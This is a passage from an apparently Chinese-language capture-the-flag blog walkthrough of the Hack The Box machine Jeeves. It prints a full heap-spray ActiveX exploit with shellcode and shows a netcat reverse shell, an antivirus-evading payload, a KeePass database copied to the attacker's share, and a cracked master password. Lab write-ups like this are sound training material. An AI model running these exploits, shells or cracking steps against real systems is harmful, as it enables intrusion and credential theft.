class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ <span class="hljs-built_in">cat</span> 4452.html <br>&lt;html&gt;<br><br>&lt;SCRIPT language=<span class="hljs-string">&quot;javascript&quot;</span>&gt;<br><br>// This is new technique I invent call <span class="hljs-string">&#x27;heap fill attack&#x27;</span><br><br>var str0ke = 0x0d0d0d0d;<br><br>var sucks = unescape( // Launch the system calculator 100 <span class="hljs-built_in">times</span> because what <span class="hljs-keyword">else</span>?<br><br>                      // This code currently not work on Solaris/Sparc<br><br>        <span class="hljs-string">&quot;%u9090%u9090%uE8FC%u0044%u0000%u458B%u8B3C%u057C%u0178%u8BEF%u184F%u5F8B%u0120&quot;</span> +<br><br>        <span class="hljs-string">&quot;%u49EB%u348B%u018B%u31EE%u99C0%u84AC%u74C0%uC107%u0DCA%uC201%uF4EB%u543B%u0424&quot;</span> +<br><br>        <span class="hljs-string">&quot;%uE575%u5F8B%u0124%u66EB%u0C8B%u8B4B%u1C5F%uEB01%u1C8B%u018B%u89EB%u245C%uC304&quot;</span> +<br><br>        <span class="hljs-string">&quot;%uC031%u8B64%u3040%uC085%u0C78%u408B%u8B0C%u1C70%u8BAD%u0868%u09EB%u808B%u00B0&quot;</span> +<br><br>        <span class="hljs-string">&quot;%u0000%u688B%u5F3C%uF631%u5660%uF889%uC083%u507B%uF068%u048A%u685F%uFE98%u0E8A&quot;</span> +<br><br>        <span class="hljs-string">&quot;%uFF57%u63E7%u6C61%u0063&quot;</span>);<br><br>var dick = 0x400000;<br><br>var j0hnson = sucks.length * 2;<br><br>var spraySlideSize = dick - (j0hnson+0x38);<br><br>var spraySlide = unescape(<span class="hljs-string">&quot;%u9090%u9090&quot;</span>);<br><br>spraySlide = getSpraySlide(spraySlide,spraySlideSize);<br><br>heapBlocks = (str0ke - 0x400000)/dick;<br><br>memory = new Array();<span class="hljs-keyword">for</span> (i=0;i&lt;heapBlocks;i++)<br><br>&#123;memory[i] = spraySlide + sucks;&#125;<br><br>try&#123;<br><br>gadi = new ActiveXObject( <span class="hljs-string">&#x27;AskJeevesToolBar.SettingsPlugin.1&#x27;</span> );<br><br>&#125;<br><br>catch(evron)<br><br>&#123;<br><br>alert(evron);<br><br>&#125;<br><br>netdev = <span class="hljs-string">&quot;A&quot;</span>;<br><br><span class="hljs-keyword">while</span> (netdev.length != 0x5e0)<br><br>netdev += <span class="hljs-string">&quot;A&quot;</span>;<br><br>netdev += unescape(<span class="hljs-string">&quot;%0d%0d%0d%0d&quot;</span>);<br><br>gadi.ShortFormat = netdev;<br><br><span class="hljs-keyword">function</span> getSpraySlide(spraySlide, spraySlideSize)<br><br>        &#123;<span class="hljs-keyword">while</span> (spraySlide.length*2&lt;spraySlideSize)&#123;<br><br>        spraySlide += spraySlide;&#125;<br><br>        spraySlide = spraySlide.substring(0,spraySlideSize/2);<br><br>        <span class="hljs-built_in">return</span> spraySlide;&#125;<br><br>&lt;/script&gt;<br><br>&lt;/html&gt;<br><br><span class="hljs-comment"># milw0rm.com [2007-09-24]                                                                                                                                       </span><br>Crazy:~/HackTheBox$ <br></code></pre></td></tr></table></figure><p>这看起来对我没什么用。我重新进行了端口扫描，因为masscan漏扫是常有的事：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ sudo nmap -sC -sV 10.10.10.63 -Pn -p-    <br>Starting Nmap 7.92SVN ( https://ParrotOS.org ) at 2022-08-29 22:07 CST<br>Stats: 0:01:24 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br>SYN Stealth Scan Timing: About 27.49% <span class="hljs-keyword">done</span>; ETC: 22:12 (0:03:42 remaining)<br>Nmap scan report <span class="hljs-keyword">for</span> jeeves.htb (10.10.10.63)<br>Host is up (0.13s latency).<br>Not shown: 65531 filtered tcp ports (no-response)<br>PORT      STATE SERVICE      VERSION<br>80/tcp    open  http         Microsoft IIS httpd 10.0<br>|_http-server-header: Microsoft-IIS/10.0<br>| http-methods: <br>|_  Potentially risky methods: TRACE<br>|_http-title: Ask Jeeves<br>135/tcp   open  msrpc        Microsoft Windows RPC<br>445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)<br>50000/tcp open  http         Jetty 9.4.z-SNAPSHOT<br>|_http-server-header: Jetty(9.4.z-SNAPSHOT)<br>|_http-title: Error 404 Not Found<br>Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>| smb-security-mode: <br>|   account_used: guest<br>|   authentication_level: user<br>|   challenge_response: supported<br>|_  message_signing: disabled (dangerous, but default)<br>|_clock-skew: mean: 4h59m59s, deviation: 0s, median: 4h59m59s<br>| smb2-security-mode: <br>|   311: <br>|_    Message signing enabled but not required<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2022-08-29T19:11:12<br>|_  start_date: 2022-08-29T18:53:39<br><br>Service detection performed. Please report any incorrect results at https://ParrotOS.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 249.71 seconds<br>zsh: segmentation fault  sudo nmap -sC -sV 10.10.10.63 -Pn -p-<br></code></pre></td></tr></table></figure><p>这不像是HTB内部的链接：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220829221344768.png" alt="image-20220829221344768"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ gobuster <span class="hljs-built_in">dir</span> -u http://10.10.10.63 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x html,php,asp,aspx<br>===============================================================<br>Gobuster v3.1.0<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://10.10.10.63<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.1.0<br>[+] Extensions:              html,php,asp,aspx<br>[+] Timeout:                 10s<br>===============================================================<br>2022/08/29 22:15:38 Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/index.html           (Status: 200) [Size: 503]<br>/askjeeves  (Status: 302)<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220829223138811.png" alt="image-20220829223138811"></p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220829223342514.png" alt="image-20220829223342514"></p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220829223415115.png" alt="image-20220829223415115"></p><p>有杀软的：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220829224837329.png" alt="image-20220829224837329"></p><p>我选择用SMB给它传个免杀载荷：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220829230924982.png" alt="image-20220829230924982"></p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220829230958994.png" alt="image-20220829230958994"></p><p>不知道什么原因失败了：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220829231237892.png" alt="image-20220829231237892"></p><p>看来得找时间去学习研究一下powershell 的免杀了：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220829231408472.png" alt="image-20220829231408472"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ nc -lvnp 1337<br>listening on [any] 1337 ...<br>connect to [10.10.16.2] from (UNKNOWN) [10.10.10.63] 49677<br><span class="hljs-built_in">ls</span><br>PS C:\Users\Administrator\.jenkins\workspace\<span class="hljs-built_in">test</span>&gt; <span class="hljs-built_in">ls</span><br>PS C:\Users\Administrator\.jenkins\workspace\<span class="hljs-built_in">test</span>&gt; <br></code></pre></td></tr></table></figure><p>不知道为什么不上线cs：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">PS C:\ProgramData&gt; cmd /c <span class="hljs-string">&quot;start /b .\code.exe&quot;</span><br>PS C:\ProgramData&gt; <span class="hljs-built_in">ls</span><br><br><br>    Directory: C:\ProgramData<br><br><br>Mode                LastWriteTime         Length Name                                                                  <br>----                -------------         ------ ----                                                                  <br>d-----       10/30/2015   3:24 AM                Comms                                                                 <br>d---s-        11/5/2017   9:15 PM                Microsoft                                                             <br>d-----       10/25/2017   4:51 PM                Microsoft OneDrive                                                    <br>d-----        11/3/2017  10:27 PM                Oracle                                                                <br>d-----       10/30/2015   5:07 AM                regid.1991-06.com.microsoft                                           <br>d-----       10/30/2015   3:24 AM                SoftwareDistribution                                                  <br>d-----       10/25/2017   4:44 PM                USOPrivate                                                            <br>d-----       10/25/2017   4:44 PM                USOShared                                                             <br>da----       10/25/2017   4:49 PM                VMware                                                                <br>-a----        8/29/2022  11:06 AM          12800 code.exe                                                              <br><br><br>PS C:\ProgramData&gt; .\code.exe<br>PS C:\ProgramData&gt; <br></code></pre></td></tr></table></figure><p>user.txt:</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bat">PS C:\Users\kohsuke&gt; <span class="hljs-built_in">cd</span> Desktop<br>PS C:\Users\kohsuke\Desktop&gt; ls<br><span class="hljs-function"></span><br><span class="hljs-function"></span><br><span class="hljs-function">    Directory: <span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">kohsuke</span>\<span class="hljs-title">Desktop</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">Mode</span>                <span class="hljs-title">LastWriteTime</span>         <span class="hljs-title">Length</span> <span class="hljs-title">Name</span>                                                                  </span><br><span class="hljs-function">----                -------------         ------ ----                                                                  </span><br><span class="hljs-function">-<span class="hljs-title">ar</span>---        11/3/2017  11:22 <span class="hljs-title">PM</span>             32 <span class="hljs-title">user.txt</span>                                                              </span><br><span class="hljs-function"></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">PS</span> <span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">kohsuke</span>\<span class="hljs-title">Desktop</span>&gt; <span class="hljs-title">cat</span> <span class="hljs-title">user.txt</span></span><br><span class="hljs-function"><span class="hljs-title">e323</span>.....................................</span><br></code></pre></td></tr></table></figure><p>或许可以考虑土豆提权：</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs bat">PS C:\Users\kohsuke\Desktop&gt; whoami /all<br><br>USER INFORMATION<br>----------------<br><br>User Name      SID                                        <br>============== ===========================================<br>jeeves\kohsuke S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">2851396806</span>-<span class="hljs-number">8246019</span>-<span class="hljs-number">2289784878</span>-<span class="hljs-number">1001</span><br><br><br>GROUP INFORMATION<br>-----------------<br><br>Group Name                           <span class="hljs-built_in">Type</span>             SID          Attributes                                        <br>==================================== ================ ============ ==================================================<br>Everyone                             Well-known group S-<span class="hljs-number">1</span>-<span class="hljs-number">1</span>-<span class="hljs-number">0</span>      Mandatory group, Enabled by default, Enabled group<br>BUILTIN\Users                        Alias            S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">545</span> Mandatory group, Enabled by default, Enabled group<br>NT AUTHORITY\SERVICE                 Well-known group S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">6</span>      Mandatory group, Enabled by default, Enabled group<br>CONSOLE LOGON                        Well-known group S-<span class="hljs-number">1</span>-<span class="hljs-number">2</span>-<span class="hljs-number">1</span>      Mandatory group, Enabled by default, Enabled group<br>NT AUTHORITY\Authenticated Users     Well-known group S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">11</span>     Mandatory group, Enabled by default, Enabled group<br>NT AUTHORITY\This Organization       Well-known group S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">15</span>     Mandatory group, Enabled by default, Enabled group<br>NT AUTHORITY\Local account           Well-known group S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">113</span>    Mandatory group, Enabled by default, Enabled group<br>LOCAL                                Well-known group S-<span class="hljs-number">1</span>-<span class="hljs-number">2</span>-<span class="hljs-number">0</span>      Mandatory group, Enabled by default, Enabled group<br>NT AUTHORITY\NTLM Authentication     Well-known group S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">64</span>-<span class="hljs-number">10</span>  Mandatory group, Enabled by default, Enabled group<br><span class="hljs-function">Mandatory Label\<span class="hljs-title">High</span> <span class="hljs-title">Mandatory</span> <span class="hljs-title">Level</span> <span class="hljs-title">Label</span>            <span class="hljs-title">S</span>-1-16-12288                                                   </span><br><span class="hljs-function"></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">PRIVILEGES</span> <span class="hljs-title">INFORMATION</span></span><br><span class="hljs-function">----------------------</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">Privilege</span> <span class="hljs-title">Name</span>                <span class="hljs-title">Description</span>                               <span class="hljs-title">State</span>   </span><br><span class="hljs-function">============================= ========================================= ========</span><br><span class="hljs-function"><span class="hljs-title">SeShutdownPrivilege</span>           <span class="hljs-title">Shut</span> <span class="hljs-title">down</span> <span class="hljs-title">the</span> <span class="hljs-title">system</span>                      <span class="hljs-title">Disabled</span></span><br><span class="hljs-function"><span class="hljs-title">SeChangeNotifyPrivilege</span>       <span class="hljs-title">Bypass</span> <span class="hljs-title">traverse</span> <span class="hljs-title">checking</span>                  <span class="hljs-title">Enabled</span> </span><br><span class="hljs-function"><span class="hljs-title">SeUndockPrivilege</span>             <span class="hljs-title">Remove</span> <span class="hljs-title">computer</span> <span class="hljs-title">from</span> <span class="hljs-title">docking</span> <span class="hljs-title">station</span>      <span class="hljs-title">Disabled</span></span><br><span class="hljs-function"><span class="hljs-title">SeImpersonatePrivilege</span>        <span class="hljs-title">Impersonate</span> <span class="hljs-title">a</span> <span class="hljs-title">client</span> <span class="hljs-title">after</span> <span class="hljs-title">authentication</span> <span class="hljs-title">Enabled</span> </span><br><span class="hljs-function"><span class="hljs-title">SeCreateGlobalPrivilege</span>       <span class="hljs-title">Create</span> <span class="hljs-title">global</span> <span class="hljs-title">objects</span>                     <span class="hljs-title">Enabled</span> </span><br><span class="hljs-function"><span class="hljs-title">SeIncreaseWorkingSetPrivilege</span> <span class="hljs-title">Increase</span> <span class="hljs-title">a</span> <span class="hljs-title">process</span> <span class="hljs-title">working</span> <span class="hljs-title">set</span>            <span class="hljs-title">Disabled</span></span><br><span class="hljs-function"><span class="hljs-title">SeTimeZonePrivilege</span>           <span class="hljs-title">Change</span> <span class="hljs-title">the</span> <span class="hljs-title">time</span> <span class="hljs-title">zone</span>                      <span class="hljs-title">Disabled</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">PS</span> <span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">kohsuke</span>\<span class="hljs-title">Desktop</span>&gt; <span class="hljs-title">cmd</span></span><br><span class="hljs-function"><span class="hljs-title">Microsoft</span> <span class="hljs-title">Windows</span> [<span class="hljs-title">Version</span> 10.0.10586]</span><br><span class="hljs-function">(<span class="hljs-title">c</span>) 2015 <span class="hljs-title">Microsoft</span> <span class="hljs-title">Corporation</span>. <span class="hljs-title">All</span> <span class="hljs-title">rights</span> <span class="hljs-title">reserved</span>.</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">kohsuke</span>\<span class="hljs-title">Desktop</span>&gt;</span><br><span class="hljs-function"><span class="hljs-title">PS</span> <span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">kohsuke</span>\<span class="hljs-title">Desktop</span>&gt; <span class="hljs-title">cmd.exe</span></span><br><span class="hljs-function"><span class="hljs-title">Microsoft</span> <span class="hljs-title">Windows</span> [<span class="hljs-title">Version</span> 10.0.10586]</span><br><span class="hljs-function">(<span class="hljs-title">c</span>) 2015 <span class="hljs-title">Microsoft</span> <span class="hljs-title">Corporation</span>. <span class="hljs-title">All</span> <span class="hljs-title">rights</span> <span class="hljs-title">reserved</span>.</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">kohsuke</span>\<span class="hljs-title">Desktop</span>&gt;</span><br><span class="hljs-function"><span class="hljs-title">PS</span> <span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">kohsuke</span>\<span class="hljs-title">Desktop</span>&gt; </span><br></code></pre></td></tr></table></figure><p>但目标系统似乎运行不了exe。在Document下有个奇怪的文件：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs powershell">Mode                LastWriteTime         Length Name                                                                  <br><span class="hljs-literal">----</span>                <span class="hljs-literal">-------------</span>         <span class="hljs-literal">------</span> <span class="hljs-literal">----</span>                                                                  <br>d<span class="hljs-literal">-----</span>        <span class="hljs-number">11</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">10</span>:<span class="hljs-number">51</span> PM                .groovy                                                               <br>d<span class="hljs-literal">-r---</span>        <span class="hljs-number">11</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">11</span>:<span class="hljs-number">15</span> PM                Contacts                                                              <br>d<span class="hljs-literal">-r---</span>        <span class="hljs-number">11</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">11</span>:<span class="hljs-number">19</span> PM                Desktop                                                               <br>d<span class="hljs-literal">-r---</span>        <span class="hljs-number">11</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">11</span>:<span class="hljs-number">18</span> PM                Documents                                                             <br>d<span class="hljs-literal">-r---</span>        <span class="hljs-number">11</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">11</span>:<span class="hljs-number">15</span> PM                Downloads                                                             <br>d<span class="hljs-literal">-r---</span>        <span class="hljs-number">11</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">11</span>:<span class="hljs-number">15</span> PM                Favorites                                                             <br>d<span class="hljs-literal">-r---</span>        <span class="hljs-number">11</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">11</span>:<span class="hljs-number">22</span> PM                Links                                                                 <br>d<span class="hljs-literal">-r---</span>        <span class="hljs-number">11</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">11</span>:<span class="hljs-number">15</span> PM                Music                                                                 <br>d<span class="hljs-literal">-r---</span>        <span class="hljs-number">11</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">11</span>:<span class="hljs-number">22</span> PM                OneDrive                                                              <br>d<span class="hljs-literal">-r---</span>        <span class="hljs-number">11</span>/<span class="hljs-number">4</span>/<span class="hljs-number">2017</span>   <span class="hljs-number">3</span>:<span class="hljs-number">10</span> AM                Pictures                                                              <br>d<span class="hljs-literal">-r---</span>        <span class="hljs-number">11</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">11</span>:<span class="hljs-number">15</span> PM                Saved Games                                                           <br>d<span class="hljs-literal">-r---</span>        <span class="hljs-number">11</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">11</span>:<span class="hljs-number">16</span> PM                Searches                                                              <br>d<span class="hljs-literal">-r---</span>        <span class="hljs-number">11</span>/<span class="hljs-number">3</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">11</span>:<span class="hljs-number">15</span> PM                Videos                                                                <br><br><br><span class="hljs-built_in">cd</span> Documents <br><span class="hljs-built_in">ls</span><br><br><br>    Directory: C:\Users\kohsuke\Documents<br><br><br>Mode                LastWriteTime         Length Name                                                                  <br><span class="hljs-literal">----</span>                <span class="hljs-literal">-------------</span>         <span class="hljs-literal">------</span> <span class="hljs-literal">----</span>                                                                  <br><span class="hljs-literal">-a----</span>        <span class="hljs-number">9</span>/<span class="hljs-number">18</span>/<span class="hljs-number">2017</span>   <span class="hljs-number">1</span>:<span class="hljs-number">43</span> PM           <span class="hljs-number">2846</span> CEH.kdbx                                                              <br><br><br><span class="hljs-built_in">copy</span> .\CEH.kdbx \\<span class="hljs-number">10.10</span>.<span class="hljs-number">16.2</span>\share\<br><span class="hljs-built_in">PS</span> C:\Users\kohsuke\Documents&gt; <br></code></pre></td></tr></table></figure><p>尝试破解其中密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ keepass2john CEH.kdbx<br>CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48<br>                                                                                                                                                                                                                                                                                 <br>Crazy:~/HackTheBox$ keepass2john CEH.kdbx&gt;CEHhash<br>Crazy:~/HackTheBox$ john CEHhash -w=/usr/share/wordlists/rockyou.txt <br>Using default input encoding: UTF-8<br>Loaded 1 password <span class="hljs-built_in">hash</span> (KeePass [SHA256 AES 32/64])<br>Cost 1 (iteration count) is 6000 <span class="hljs-keyword">for</span> all loaded hashes<br>Cost 2 (version) is 2 <span class="hljs-keyword">for</span> all loaded hashes<br>Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 <span class="hljs-keyword">for</span> all loaded hashes<br>Will run 8 OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>moonshine1       (CEH)     <br>1g 0:00:00:32 DONE (2022-08-29 23:32) 0.03052g/s 1678p/s 1678c/s 1678C/s nick18..moonshine1<br>Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably<br>Session completed. <br></code></pre></td></tr></table></figure><p>这个软件是我第一次遇到，根据帮助文档，列出所有密码表：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ kpcli --kdb CEH.kdbx                            <br>Provide the master password: *************************<br><br>KeePass CLI (kpcli) v3.7 is ready <span class="hljs-keyword">for</span> operation.<br>Type <span class="hljs-string">&#x27;help&#x27;</span> <span class="hljs-keyword">for</span> a description of available commands.<br>Type <span class="hljs-string">&#x27;help &lt;command&gt;&#x27;</span> <span class="hljs-keyword">for</span> details on individual commands.<br><br>kpcli:/&gt; find .<br>Searching <span class="hljs-keyword">for</span> <span class="hljs-string">&quot;.&quot;</span> ...<br> - 8 matches found and placed into /_found/<br>Would you like to list them now? [y/N] <br>=== Entries ===<br>0. Backup stuff                                                           <br>1. Bank of America                                   www.bankofamerica.com<br>2. DC Recovery PW                                                         <br>3. EC-Council                               www.eccouncil.org/programs/cer<br>4. It<span class="hljs-string">&#x27;s a secret                                 localhost:8180/secret.jsp</span><br><span class="hljs-string">5. Jenkins admin                                            localhost:8080</span><br><span class="hljs-string">6. Keys to the kingdom                                                    </span><br><span class="hljs-string">7. Walmart.com                                             www.walmart.com</span><br><span class="hljs-string">kpcli:/&gt; </span><br></code></pre></td></tr></table></figure><p>可以制定序号去查看每一条密码：</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span 